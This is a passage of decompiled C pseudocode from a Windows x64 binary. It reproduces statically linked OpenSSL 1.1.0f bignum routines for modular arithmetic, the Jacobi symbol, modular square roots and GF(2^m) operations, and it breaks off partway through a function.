//----- (00000001400795A0) ----------------------------------------------------
__int64 __fastcall sub_1400795A0(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 result; // rax

  result = sub_140046FD0(a1, a2);
  if ( (_DWORD)result )
  {
    if ( (int)sub_140026AB0(a1, a3) < 0 )
      return 1i64;
    else
      return sub_140041AC0(a1, a1, (__int64)a3);
  }
  return result;
}

//----- (0000000140079610) ----------------------------------------------------
__int64 __fastcall sub_140079610(__int64 *a1, __int64 a2, int a3, __int64 *a4)
{
  __int64 result; // rax
  int v8; // edi
  int v9; // esi

  if ( a1 == (__int64 *)a2 || (result = (__int64)sub_140026E90((__int64)a1, a2)) != 0 )
  {
    if ( a3 <= 0 )
    {
      return 1i64;
    }
    else
    {
      while ( 1 )
      {
        v8 = sub_140027260((__int64)a1);
        v9 = sub_140027260((__int64)a4) - v8;
        if ( v9 < 0 )
          break;
        if ( v9 > a3 )
          v9 = a3;
        if ( v9 )
        {
          if ( !(unsigned int)sub_140046E40((__int64)a1, a1, v9) )
            return 0i64;
          a3 -= v9;
        }
        else
        {
          if ( !(unsigned int)sub_140046FD0((__int64)a1, (__int64)a1) )
            return 0i64;
          --a3;
        }
        if ( (int)sub_140026AB0((__int64)a1, a4) >= 0
          && !(unsigned int)sub_140041AC0((__int64)a1, (__int64)a1, (__int64)a4) )
        {
          return 0i64;
        }
        if ( a3 <= 0 )
          return 1i64;
      }
      sub_140024610(3, 119, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_mod.c", 174);
      return 0i64;
    }
  }
  return result;
}

//----- (0000000140079710) ----------------------------------------------------
__int64 __fastcall sub_140079710(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v9; // edi
  _QWORD *v10; // rax
  __int64 v11; // rbp
  int v12; // eax

  v9 = 0;
  sub_140027D40(a5);
  v10 = sub_140027C40(a5);
  v11 = (__int64)v10;
  if ( v10 )
  {
    if ( a2 == a3 )
      v12 = sub_14006F810((__int64)v10, a2, a5);
    else
      v12 = sub_14006E5B0((__int64)v10, a2, a3, a5);
    if ( v12 && (unsigned int)sub_1400798F0(a1, v11, a4, a5) )
      v9 = 1;
  }
  sub_140027B60((__int64)a5);
  return v9;
}

//----- (00000001400797D0) ----------------------------------------------------
__int64 __fastcall sub_1400797D0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  __int64 result; // rax

  result = sub_14006F810(a1, a2, a4);
  if ( (_DWORD)result )
    return sub_140041D70(0i64, a1, a1, a3, a4);
  return result;
}

//----- (0000000140079840) ----------------------------------------------------
__int64 __fastcall sub_140079840(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  __int64 result; // rax

  result = sub_140041AC0(a1, a2, a3);
  if ( (_DWORD)result )
    return sub_1400798F0(a1, a1, a4, a5);
  return result;
}

//----- (0000000140079890) ----------------------------------------------------
__int64 __fastcall sub_140079890(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax

  result = sub_140041AC0(a1, a2, a3);
  if ( (_DWORD)result )
  {
    if ( *(_DWORD *)(a1 + 16) )
      return sub_140041A10(a1, a1, a4);
    else
      return 1i64;
  }
  return result;
}

//----- (00000001400798F0) ----------------------------------------------------
__int64 __fastcall sub_1400798F0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  __int64 result; // rax
  __int64 (__fastcall *v7)(__int64, __int64, __int64); // rax

  result = sub_140041D70(0i64, a1, a2, a3, a4);
  if ( (_DWORD)result )
  {
    if ( *(_DWORD *)(a1 + 16) )
    {
      v7 = sub_140041A10;
      if ( *(_DWORD *)(a3 + 16) )
        v7 = sub_140041AC0;
      return v7(a1, a1, a3);
    }
    else
    {
      return 1i64;
    }
  }
  return result;
}

//----- (0000000140079970) ----------------------------------------------------
__int64 __fastcall sub_140079970(__int64 a1, __int64 a2, int *a3)
{
  int v3; // eax
  unsigned int v5; // ebp
  unsigned int v6; // esi
  BOOL v7; // r15d
  __int64 **v10; // rbx
  __int64 **v11; // r14
  _QWORD *v12; // rax
  int i; // edi
  int v14; // eax
  int j; // edi
  int v16; // eax
  __int64 v17; // rax
  __int64 v18; // rcx
  __int64 v19; // rax
  int v20; // edi
  int v21; // eax
  __int64 **v22; // rax
  __int64 v23; // rcx

  v5 = v3 - 34;
  v6 = 0;
  v7 = 0;
  sub_140027D40(a3);
  v10 = (__int64 **)sub_140027C40(a3);
  v11 = (__int64 **)sub_140027C40(a3);
  if ( !v11 )
    goto LABEL_45;
  LOBYTE(v7) = sub_140026E90((__int64)v10, a1) == 0i64;
  if ( v7 )
    goto LABEL_45;
  v12 = sub_140026E90((__int64)v11, a2);
  v7 = v12 == 0i64;
  if ( !v12 )
    goto LABEL_45;
  if ( sub_140027160((__int64)v11) )
  {
    v5 = sub_140026810((__int64)v10, v5 + 3);
    goto LABEL_45;
  }
  if ( !sub_1400270F0((__int64)v10) && !sub_1400270F0((__int64)v11) )
  {
LABEL_44:
    v5 = v6;
    goto LABEL_45;
  }
  for ( i = 0; !(unsigned int)sub_1400270A0((__int64)v11, i); ++i )
    ;
  v14 = sub_140047090((__int64)v11, (__int64)v11, i);
  v7 = v14 == 0;
  if ( !v14 )
    goto LABEL_45;
  if ( (i & 1) != 0 )
  {
    if ( *((_DWORD *)v10 + 2) )
      v5 = dword_14010F2C8[**v10 & 7];
    else
      v5 = dword_14010F2C8[0];
  }
  else
  {
    v5 = 1;
  }
  if ( *((_DWORD *)v11 + 4) )
  {
    *((_DWORD *)v11 + 4) = 0;
    if ( *((_DWORD *)v10 + 4) )
      v5 = -v5;
  }
  if ( sub_140027160((__int64)v10) )
  {
LABEL_42:
    if ( sub_140027110((__int64)v11) )
      v6 = v5;
    goto LABEL_44;
  }
  while ( 1 )
  {
    for ( j = 0; !(unsigned int)sub_1400270A0((__int64)v10, j); ++j )
      ;
    v16 = sub_140047090((__int64)v10, (__int64)v10, j);
    v7 = v16 == 0;
    if ( !v16 )
      break;
    if ( (j & 1) != 0 )
    {
      if ( *((_DWORD *)v11 + 2) )
        v17 = **v11;
      else
        LOBYTE(v17) = 0;
      v5 *= dword_14010F2C8[v17 & 7];
    }
    if ( *((_DWORD *)v10 + 4) )
    {
      if ( *((_DWORD *)v10 + 2) )
        v18 = ~**v10;
      else
        LOBYTE(v18) = -1;
    }
    else if ( *((_DWORD *)v10 + 2) )
    {
      v18 = **v10;
    }
    else
    {
      LOBYTE(v18) = 0;
    }
    if ( *((_DWORD *)v11 + 2) )
      v19 = **v11;
    else
      LOBYTE(v19) = 0;
    v20 = -v5;
    if ( ((unsigned __int8)v18 & (unsigned __int8)v19 & 2) == 0 )
      v20 = v5;
    v21 = sub_1400798F0((__int64)v11, (__int64)v11, (__int64)v10, a3);
    v5 = v20;
    v7 = v21 == 0;
    if ( !v21 )
      break;
    v22 = v10;
    v10 = v11;
    v23 = (__int64)v11;
    v11 = v22;
    *((_DWORD *)v22 + 4) = 0;
    if ( sub_140027160(v23) )
      goto LABEL_42;
  }
LABEL_45:
  sub_140027B60((__int64)a3);
  if ( v7 )
    return (unsigned int)-2;
  return v5;
}
// 140079998: variable 'v3' is possibly undefined
// 14010F2C8: using guessed type _DWORD dword_14010F2C8[8];

//----- (0000000140079C00) ----------------------------------------------------
__int64 *__fastcall sub_140079C00(__int64 *a1, __int64 a2, unsigned __int64 a3, int *a4)
{
  __int64 *v5; // r12
  _QWORD *v9; // r13
  _QWORD *v10; // rdi
  __int64 *v11; // r15
  int v12; // ebx
  __int64 *v13; // rbx
  __int64 v14; // rsi
  int v15; // esi
  int v16; // eax
  __int64 (__fastcall *v17)(__int64, __int64, __int64); // rax
  int v18; // eax
  int v20; // esi
  int v21; // ebx
  int v22; // eax
  __int64 *v23; // [rsp+30h] [rbp-48h]
  _QWORD *v24; // [rsp+38h] [rbp-40h]
  _QWORD *v25; // [rsp+40h] [rbp-38h]

  v5 = a1;
  if ( !sub_1400270F0(a3) || sub_140026810(a3, 1i64) )
  {
    if ( !sub_140026810(a3, 2i64) )
    {
      sub_140024610(3, 121, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_sqrt.c", 41);
      return 0i64;
    }
    if ( !a1 )
    {
      v5 = (__int64 *)sub_140027200();
      if ( !v5 )
        goto LABEL_92;
    }
    v22 = sub_1400270A0(a2, 0);
  }
  else
  {
    if ( !sub_140027160(a2) && !sub_140027110(a2) )
    {
      sub_140027D40(a4);
      v23 = sub_140027C40(a4);
      v25 = sub_140027C40(a4);
      v9 = sub_140027C40(a4);
      v10 = sub_140027C40(a4);
      v24 = sub_140027C40(a4);
      v11 = sub_140027C40(a4);
      if ( v11 )
      {
        if ( a1 || (v5 = (__int64 *)sub_140027200()) != 0i64 )
        {
          if ( !(unsigned int)sub_1400798F0((__int64)v23, a2, a3, a4) )
            goto LABEL_81;
          v12 = 1;
          if ( (unsigned int)sub_1400270A0(a3, 1) )
            goto LABEL_100;
          do
            ++v12;
          while ( !(unsigned int)sub_1400270A0(a3, v12) );
          if ( v12 == 1 )
          {
LABEL_100:
            if ( (unsigned int)sub_140047090((__int64)v9, a3, 2) )
            {
              *((_DWORD *)v9 + 4) = 0;
              if ( (unsigned int)sub_14003E600((__int64)v9, 1ui64) )
              {
                v13 = v23;
                if ( (unsigned int)sub_14007BD10(v5, (__int64)v23, (__int64)v9, a3, a4) )
                {
                  v14 = (__int64)v24;
                  goto LABEL_78;
                }
              }
            }
          }
          else if ( v12 == 2 )
          {
            v13 = v23;
            if ( (unsigned int)sub_1400795A0((__int64)v10, (__int64)v23, (__int64 *)a3) )
            {
              if ( (unsigned int)sub_140047090((__int64)v9, a3, 3) )
              {
                *((_DWORD *)v9 + 4) = 0;
                if ( (unsigned int)sub_14007BD10(v25, (__int64)v10, (__int64)v9, a3, a4) )
                {
                  if ( (unsigned int)sub_1400797D0((__int64)v11, (__int64)v25, a3, a4) )
                  {
                    if ( (unsigned int)sub_140079710((__int64)v10, (__int64)v10, (__int64)v11, a3, a4) )
                    {
                      if ( (unsigned int)sub_14003E980((__int64)v10, 1ui64) )
                      {
                        v14 = (__int64)v24;
                        if ( (unsigned int)sub_140079710((__int64)v24, (__int64)v23, (__int64)v25, a3, a4) )
                        {
                          if ( (unsigned int)sub_140079710((__int64)v24, (__int64)v24, (__int64)v10, a3, a4)
                            && sub_140026E90((__int64)v5, (__int64)v24) )
                          {
                            goto LABEL_78;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          else if ( sub_140026E90((__int64)v9, a3) )
          {
            *((_DWORD *)v9 + 4) = 0;
            v15 = 2;
            while ( 1 )
            {
              if ( v15 < 22 )
                goto LABEL_32;
              v16 = sub_140027260(a3);
              if ( !(unsigned int)sub_140028290((__int64)v11, v16, 0, 0) )
                goto LABEL_81;
              if ( (int)sub_140027600(v11, (__int64 *)a3) >= 0 )
              {
                v17 = sub_140041AC0;
                if ( *(_DWORD *)(a3 + 16) )
                  v17 = sub_140041A10;
                if ( !(unsigned int)v17((__int64)v11, (__int64)v11, a3) )
                  goto LABEL_81;
              }
              if ( sub_140027160((__int64)v11) )
              {
LABEL_32:
                if ( !(unsigned int)sub_140027560((__int64)v11, v15) )
                  goto LABEL_81;
              }
              v18 = sub_140079970((__int64)v11, (__int64)v9, a4);
              if ( v18 < -1 )
                goto LABEL_81;
              if ( !v18 )
              {
                sub_140024610(3, 121, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_sqrt.c", 199);
                goto LABEL_81;
              }
              if ( v18 != 1 )
                break;
              if ( ++v15 >= 82 )
                goto LABEL_37;
            }
            if ( v18 != -1 )
            {
LABEL_37:
              sub_140024610(3, 121, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_sqrt.c", 211);
              goto LABEL_81;
            }
            if ( (unsigned int)sub_140047090((__int64)v9, (__int64)v9, v12)
              && (unsigned int)sub_14007BD10(v11, (__int64)v11, (__int64)v9, a3, a4) )
            {
              if ( sub_140027110((__int64)v11) )
              {
                sub_140024610(3, 121, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_sqrt.c", 226);
                goto LABEL_81;
              }
              if ( (unsigned int)sub_140047230((__int64)v10, (__int64)v9) )
              {
                if ( sub_140027160((__int64)v10) )
                {
                  if ( !(unsigned int)sub_1400798F0((__int64)v10, (__int64)v23, a3, a4) )
                    goto LABEL_81;
                  if ( sub_140027160((__int64)v10) )
                    goto LABEL_47;
                  v14 = (__int64)v24;
                  if ( !(unsigned int)sub_140027560((__int64)v24, 1i64) )
                    goto LABEL_81;
                }
                else
                {
                  v14 = (__int64)v24;
                  if ( !(unsigned int)sub_14007BD10(v24, (__int64)v23, (__int64)v10, a3, a4) )
                    goto LABEL_81;
                  if ( sub_140027160((__int64)v24) )
                  {
LABEL_47:
                    sub_140027560((__int64)v5, 0i64);
                    sub_140027B60((__int64)a4);
                    return v5;
                  }
                }
                if ( (unsigned int)sub_1400797D0((__int64)v25, v14, a3, a4)
                  && (unsigned int)sub_140079710((__int64)v25, (__int64)v25, (__int64)v23, a3, a4)
                  && (unsigned int)sub_140079710(v14, v14, (__int64)v23, a3, a4) )
                {
                  if ( sub_140027110((__int64)v25) )
                  {
LABEL_70:
                    if ( !sub_140026E90((__int64)v5, v14) )
                      goto LABEL_81;
                    v13 = v23;
LABEL_78:
                    if ( (unsigned int)sub_1400797D0(v14, (__int64)v5, a3, a4) )
                    {
                      if ( !(unsigned int)sub_140026AB0(v14, v13) )
                      {
LABEL_93:
                        sub_140027B60((__int64)a4);
                        return v5;
                      }
                      sub_140024610(3, 121, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_sqrt.c", 344);
                    }
                    goto LABEL_81;
                  }
                  while ( 1 )
                  {
                    v20 = 1;
                    if ( !(unsigned int)sub_1400797D0((__int64)v10, (__int64)v25, a3, a4) )
                      break;
                    if ( !sub_140027110((__int64)v10) )
                    {
                      while ( ++v20 != v12 )
                      {
                        if ( !(unsigned int)sub_140079710((__int64)v10, (__int64)v10, (__int64)v10, a3, a4) )
                          goto LABEL_81;
                        if ( sub_140027110((__int64)v10) )
                          goto LABEL_61;
                      }
                      sub_140024610(3, 121, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_sqrt.c", 310);
                      break;
                    }
LABEL_61:
                    if ( !sub_140026E90((__int64)v10, (__int64)v11) )
                      break;
                    v21 = v12 - v20 - 1;
                    if ( v21 > 0 )
                    {
                      while ( (unsigned int)sub_1400797D0((__int64)v10, (__int64)v10, a3, a4) )
                      {
                        if ( --v21 <= 0 )
                          goto LABEL_65;
                      }
                      break;
                    }
LABEL_65:
                    if ( !(unsigned int)sub_140079710((__int64)v11, (__int64)v10, (__int64)v10, a3, a4)
                      || !(unsigned int)sub_140079710((__int64)v24, (__int64)v24, (__int64)v10, a3, a4)
                      || !(unsigned int)sub_140079710((__int64)v25, (__int64)v25, (__int64)v11, a3, a4) )
                    {
                      break;
                    }
                    v12 = v20;
                    if ( sub_140027110((__int64)v25) )
                    {
                      v14 = (__int64)v24;
                      goto LABEL_70;
                    }
                  }
                }
              }
            }
          }
LABEL_81:
          if ( v5 != a1 )
          {
            sub_140026A10(v5);
            sub_140027B60((__int64)a4);
            return 0i64;
          }
        }
      }
LABEL_92:
      v5 = 0i64;
      goto LABEL_93;
    }
    if ( !a1 )
    {
      v5 = (__int64 *)sub_140027200();
      if ( !v5 )
        goto LABEL_92;
    }
    v22 = sub_140027110(a2);
  }
  if ( (unsigned int)sub_140027560((__int64)v5, v22) )
    return v5;
  if ( v5 != a1 )
    sub_140026FF0(v5);
  return 0i64;
}

//----- (000000014007A380) ----------------------------------------------------
__int64 __fastcall sub_14007A380(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  __int64 result; // rax
  int v7; // eax
  __int64 v8; // r9
  __int64 v9; // r8

  v3 = a2;
  v4 = a3;
  if ( *(_DWORD *)(a2 + 8) >= *(_DWORD *)(a3 + 8) )
  {
    v4 = a2;
    v3 = a3;
  }
  result = (__int64)sub_140027B30(a1, *(_DWORD *)(v4 + 8));
  if ( result )
  {
    v7 = 0;
    if ( *(int *)(v3 + 8) > 0 )
    {
      v8 = 0i64;
      do
      {
        v8 += 8i64;
        ++v7;
        *(_QWORD *)(v8 + *(_QWORD *)a1 - 8) = *(_QWORD *)(v8 + *(_QWORD *)v4 - 8) ^ *(_QWORD *)(*(_QWORD *)v3 + v8 - 8);
      }
      while ( v7 < *(_DWORD *)(v3 + 8) );
    }
    if ( v7 < *(_DWORD *)(v4 + 8) )
    {
      v9 = 8i64 * v7;
      do
      {
        v9 += 8i64;
        ++v7;
        *(_QWORD *)(v9 + *(_QWORD *)a1 - 8) = *(_QWORD *)(v9 + *(_QWORD *)v4 - 8);
      }
      while ( v7 < *(_DWORD *)(v4 + 8) );
    }
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v4 + 8);
    sub_1400278D0(a1);
    return 1i64;
  }
  return result;
}

//----- (000000014007A460) ----------------------------------------------------
__int64 __fastcall sub_14007A460(__int64 a1, __int64 a2, __int64 a3)
{
  int v5; // eax
  _DWORD v7[6]; // [rsp+30h] [rbp-28h] BYREF

  v5 = sub_14007B900(a3, (__int64)v7, 6);
  if ( v5 && v5 <= 6 )
    return sub_14007A500(a1, a2, v7);
  sub_140024610(3, 131, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_gf2m.c", 406);
  return 0i64;
}
// 14007A460: using guessed type _DWORD var_28[6];

//----- (000000014007A500) ----------------------------------------------------
__int64 __fastcall sub_14007A500(__int64 a1, __int64 a2, _DWORD *a3)
{
  __int64 result; // rax
  int v7; // r8d
  __int64 v8; // rdx
  _QWORD *v9; // rdi
  int v10; // ebp
  __int64 v11; // r15
  __int64 v12; // r14
  _QWORD *v13; // rsi
  unsigned __int64 v14; // r10
  _DWORD *v15; // rcx
  __int64 i; // r9
  int v17; // r11d
  int v18; // eax
  int v19; // ecx
  int v20; // ecx
  unsigned __int64 v21; // r11
  int *v22; // rax
  __int64 j; // r9
  int v24; // eax
  char v25; // dl
  int v26; // edx
  int v27; // r10d
  int v28; // eax
  int v29; // r10d
  unsigned __int64 v30; // rax

  if ( !*a3 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  if ( a2 != a1 )
  {
    result = (__int64)sub_140027B30(a1, *(_DWORD *)(a2 + 8));
    if ( !result )
      return result;
    v7 = 0;
    if ( *(int *)(a2 + 8) > 0 )
    {
      v8 = 0i64;
      do
      {
        v8 += 8i64;
        ++v7;
        *(_QWORD *)(v8 + *(_QWORD *)a1 - 8) = *(_QWORD *)(v8 + *(_QWORD *)a2 - 8);
      }
      while ( v7 < *(_DWORD *)(a2 + 8) );
    }
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  }
  v9 = *(_QWORD **)a1;
  v10 = *(_DWORD *)(a1 + 8) - 1;
  v11 = *a3 / 64;
  v12 = v10;
  if ( v10 > v11 )
  {
    v13 = &v9[v10 - v11];
    do
    {
      v14 = v13[v11];
      if ( v14 )
      {
        v15 = a3 + 1;
        v13[v11] = 0i64;
        for ( i = 1i64; *v15; v15 = &a3[i] )
        {
          v17 = (*a3 - *v15) % 64;
          v18 = v10 - (*a3 - *v15) / 64;
          v9[v18] ^= v14 >> v17;
          if ( v17 )
            v9[v18 - 1] ^= v14 << (64 - (unsigned __int8)v17);
          ++i;
        }
        v19 = *a3 % 64;
        *v13 ^= v14 >> v19;
        if ( v19 )
          *(v13 - 1) ^= v14 << (64 - (unsigned __int8)v19);
      }
      else
      {
        --v10;
        --v12;
        --v13;
      }
    }
    while ( v12 > v11 );
  }
  if ( v10 == v11 )
  {
    while ( 1 )
    {
      v20 = *a3 % 64;
      v21 = v9[v11] >> v20;
      if ( !v21 )
        break;
      if ( v20 )
        v9[v11] = v9[v11] << (64 - (unsigned __int8)v20) >> (64 - (unsigned __int8)v20);
      else
        v9[v11] = 0i64;
      *v9 ^= v21;
      v22 = a3 + 1;
      for ( j = 1i64; *v22; v22 = &a3[j] )
      {
        v25 = *v22 >> 31;
        v24 = *v22;
        v26 = v25 & 0x3F;
        v27 = v26 + v24;
        v28 = ((v26 + v24) & 0x3F) - v26;
        v29 = v27 >> 6;
        v9[v29] ^= v21 << v28;
        if ( v28 )
        {
          v30 = v21 >> (64 - (unsigned __int8)v28);
          if ( v30 )
            v9[v29 + 1] ^= v30;
        }
        ++j;
      }
    }
  }
  sub_1400278D0(a1);
  return 1i64;
}

//----- (000000014007A790) ----------------------------------------------------
_BOOL8 __fastcall sub_14007A790(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  BOOL v9; // edi
  _QWORD *v10; // rax
  __int64 v11; // rsi

  v9 = 0;
  sub_140027D40(a5);
  v10 = sub_140027C40(a5);
  v11 = (__int64)v10;
  if ( v10 && (unsigned int)sub_14007A990((__int64)v10, a3, a4, a5) )
    v9 = sub_14007AEA0(a1, a2, v11, a4, a5) != 0;
  sub_140027B60((__int64)a5);
  return v9;
}

//----- (000000014007A840) ----------------------------------------------------
__int64 __fastcall sub_14007A840(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4, int *a5)
{
  unsigned int v9; // ebp
  _QWORD *v11; // rax
  __int64 v12; // rdi
  int v13; // ebx

  v9 = 0;
  if ( sub_140027160(a3) )
    return sub_140027560(a1, 1i64);
  if ( sub_140026810(a3, 1i64) )
  {
    LOBYTE(v9) = sub_140026E90(a1, a2) != 0i64;
  }
  else
  {
    sub_140027D40(a5);
    v11 = sub_140027C40(a5);
    v12 = (__int64)v11;
    if ( v11 && (unsigned int)sub_14007A500((__int64)v11, a2, a4) )
    {
      v13 = sub_140027260(a3) - 2;
      if ( v13 < 0 )
      {
LABEL_12:
        if ( sub_140026E90(a1, v12) )
          v9 = 1;
      }
      else
      {
        while ( (unsigned int)sub_14007B640(v12, v12, a4, a5)
             && (!(unsigned int)sub_1400270A0(a3, v13) || (unsigned int)sub_14007AF90(v12, v12, a2, a4, a5)) )
        {
          if ( --v13 < 0 )
            goto LABEL_12;
        }
      }
    }
    sub_140027B60((__int64)a5);
  }
  return v9;
}

//----- (000000014007A990) ----------------------------------------------------
__int64 __fastcall sub_14007A990(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v7; // esi
  _QWORD *v8; // r15
  int v9; // ebp
  int v10; // eax
  __int64 v11; // r13
  __int64 v12; // rax
  char *v13; // rbx
  char *v14; // r14
  _QWORD *v15; // rdi
  char *v16; // r9
  _QWORD *v17; // rdx
  char *v18; // r11
  unsigned __int64 v19; // r8
  __int64 v20; // r15
  __int64 v21; // r9
  __int64 v22; // r10
  unsigned __int64 v23; // rdi
  _QWORD *v24; // rax
  signed __int64 v25; // r11
  __int64 v26; // rsi
  __int64 v27; // rcx
  unsigned __int64 v28; // rcx
  __int64 v29; // rcx
  int v30; // ecx
  _QWORD *v31; // rax
  char **v32; // rdx
  void **v33; // rax
  __int64 v34; // r10
  __int64 v35; // rcx
  char *v36; // rdi
  char *v37; // rax
  char *v38; // rdx
  unsigned __int64 v39; // rcx
  signed __int64 v40; // rdx
  signed __int64 v41; // rcx
  const __m128i *v42; // rax
  signed __int64 v43; // rdi
  __m128i v44; // xmm0
  __m128i v45; // xmm1
  char *v46; // rcx
  __int64 v47; // rdx
  __int64 v48; // rdi
  __int64 v49; // rax
  unsigned __int64 i; // rcx
  int v51; // eax
  int v53; // [rsp+20h] [rbp-78h]
  _QWORD *v54; // [rsp+28h] [rbp-70h]
  _QWORD *v55; // [rsp+30h] [rbp-68h]
  char *v56; // [rsp+38h] [rbp-60h]
  char **v57; // [rsp+40h] [rbp-58h]
  char *v58; // [rsp+48h] [rbp-50h]
  _QWORD *v59; // [rsp+50h] [rbp-48h]

  v7 = 0;
  sub_140027D40(a4);
  v57 = (char **)sub_140027C40(a4);
  if ( v57 )
  {
    v54 = sub_140027C40(a4);
    if ( v54 )
    {
      v59 = sub_140027C40(a4);
      v8 = v59;
      if ( v59 )
      {
        v55 = sub_140027C40(a4);
        if ( v55 )
        {
          if ( (unsigned int)sub_14007A460((__int64)v59, a2, a3) )
          {
            if ( !sub_140027160((__int64)v59) )
            {
              if ( sub_140026E90((__int64)v55, a3) )
              {
                v9 = sub_140027260((__int64)v59);
                v10 = sub_140027260((__int64)v55);
                v11 = *(int *)(a3 + 8);
                v53 = v10;
                if ( sub_140027B30((__int64)v59, *(_DWORD *)(a3 + 8)) )
                {
                  v12 = *((int *)v59 + 2);
                  v13 = (char *)*v59;
                  if ( v12 < v11 )
                    memset(&v13[8 * v12], 0, 8 * (v11 - v12));
                  *((_DWORD *)v59 + 2) = v11;
                  if ( sub_140027B30((__int64)v57, v11) )
                  {
                    v14 = *v57;
                    *(_QWORD *)*v57 = 1i64;
                    if ( (int)v11 > 1 )
                      memset(v14 + 8, 0, 8i64 * ((int)v11 - 1));
                    v15 = v54;
                    *((_DWORD *)v57 + 2) = v11;
                    if ( sub_140027B30((__int64)v54, v11) )
                    {
                      v16 = (char *)*v54;
                      v56 = (char *)*v54;
                      if ( (int)v11 > 0 )
                      {
                        memset(v16, 0, 8 * v11);
                        v15 = v54;
                      }
                      v17 = v55;
                      *((_DWORD *)v15 + 2) = v11;
                      v18 = (char *)*v55;
                      v58 = (char *)*v55;
                      while ( 1 )
                      {
                        if ( v9 )
                        {
                          do
                          {
                            v19 = *(_QWORD *)v13;
                            if ( (*(_QWORD *)v13 & 1) != 0 )
                              break;
                            v20 = 0i64;
                            v21 = -(*(_QWORD *)v14 & 1i64);
                            v22 = (int)v11 - 1;
                            v23 = v21 & **(_QWORD **)a3 ^ *(_QWORD *)v14;
                            if ( (int)v11 - 1 > 0 )
                            {
                              v24 = v14 + 8;
                              v25 = v13 - v14;
                              v26 = -8i64 - (_QWORD)v14;
                              v20 = (int)v11 - 1;
                              do
                              {
                                v27 = *(_QWORD *)((char *)v24++ + v25);
                                v28 = (v19 >> 1) | (v27 << 63);
                                v19 = *(_QWORD *)((char *)v24 + v25 - 8);
                                *(_QWORD *)((char *)v24 + v25 - 16) = v28;
                                v29 = (v23 >> 1) | ((*(v24 - 1) ^ v21 & *(_QWORD *)((char *)v24 + v26 + *(_QWORD *)a3)) << 63);
                                v23 = *(v24 - 1) ^ v21 & *(_QWORD *)((char *)v24 + v26 + *(_QWORD *)a3);
                                *(v24 - 2) = v29;
                                --v22;
                              }
                              while ( v22 );
                              v7 = 0;
                            }
                            *(_QWORD *)&v13[8 * v20] = v19 >> 1;
                            *(_QWORD *)&v14[8 * v20] = v23 >> 1;
                            --v9;
                          }
                          while ( v9 );
                          v16 = v56;
                          v18 = v58;
                          v8 = v59;
                          v17 = v55;
                          v15 = v54;
                        }
                        if ( v9 <= 64 )
                        {
                          if ( !*(_QWORD *)v13 )
                            goto LABEL_54;
                          if ( *(_QWORD *)v13 == 1i64 )
                            break;
                        }
                        v30 = v53;
                        if ( v9 < v53 )
                        {
                          v31 = v8;
                          v59 = v17;
                          v8 = v17;
                          v55 = v31;
                          v32 = (char **)v31;
                          v53 = v9;
                          v33 = (void **)v57;
                          v13 = v18;
                          v14 = v16;
                          v57 = (char **)v15;
                          v9 = v30;
                          v54 = v33;
                          v18 = *v32;
                          v16 = (char *)*v33;
                          v56 = (char *)*v33;
                          v58 = *v32;
                        }
                        v34 = 0i64;
                        if ( (int)v11 >= 4 )
                        {
                          v35 = (int)v11 - 1;
                          v36 = &v16[8 * v35];
                          v37 = &v14[8 * v35];
                          if ( v14 > v36 || v37 < v16 )
                          {
                            v38 = &v13[8 * v35];
                            if ( v14 > v38 || v37 < v13 )
                            {
                              v39 = (unsigned __int64)&v18[8 * v35];
                              if ( ((unsigned __int64)v14 > v39 || v37 < v18)
                                && (v13 > v36 || v38 < v16)
                                && ((unsigned __int64)v13 > v39 || v38 < v18) )
                              {
                                v40 = v16 - v13;
                                v41 = v18 - v13;
                                v42 = (const __m128i *)(v13 + 16);
                                v43 = v14 - v13;
                                do
                                {
                                  v44 = _mm_loadu_si128(v42 - 1);
                                  v34 += 4i64;
                                  v45 = _mm_loadu_si128((const __m128i *)((char *)v42 + v41 - 16));
                                  v42 += 2;
                                  v42[-3] = _mm_xor_si128(v45, v44);
                                  *(const __m128i *)((char *)&v42[-3] + v43) = _mm_xor_si128(
                                                                                 _mm_loadu_si128((const __m128i *)((char *)v42 + v40 - 48)),
                                                                                 _mm_loadu_si128((const __m128i *)((char *)v42 + v43 - 48)));
                                  v42[-2] = _mm_xor_si128(
                                              _mm_loadu_si128((const __m128i *)((char *)v42 + v41 - 32)),
                                              _mm_loadu_si128(v42 - 2));
                                  *(const __m128i *)((char *)&v42[-2] + v43) = _mm_xor_si128(
                                                                                 _mm_loadu_si128((const __m128i *)((char *)v42 + v40 - 32)),
                                                                                 _mm_loadu_si128((const __m128i *)((char *)v42 + v43 - 32)));
                                }
                                while ( v34 < (int)(v11 - (v11 & 3)) );
                              }
                            }
                          }
                        }
                        if ( v34 < v11 )
                        {
                          v46 = &v13[8 * v34];
                          v47 = v11 - v34;
                          do
                          {
                            *(_QWORD *)v46 ^= *(_QWORD *)&v46[v18 - v13];
                            *(_QWORD *)&v46[v14 - v13] ^= *(_QWORD *)&v46[v16 - v13];
                            v46 += 8;
                            --v47;
                          }
                          while ( v47 );
                        }
                        v16 = v56;
                        v17 = v55;
                        v15 = v54;
                        if ( v9 == v53 )
                        {
                          v48 = (v9 - 1) / 64;
                          v49 = v48;
                          for ( i = *(_QWORD *)&v13[8 * v48]; !i; LODWORD(v48) = v48 - 1 )
                          {
                            if ( !v49 )
                              break;
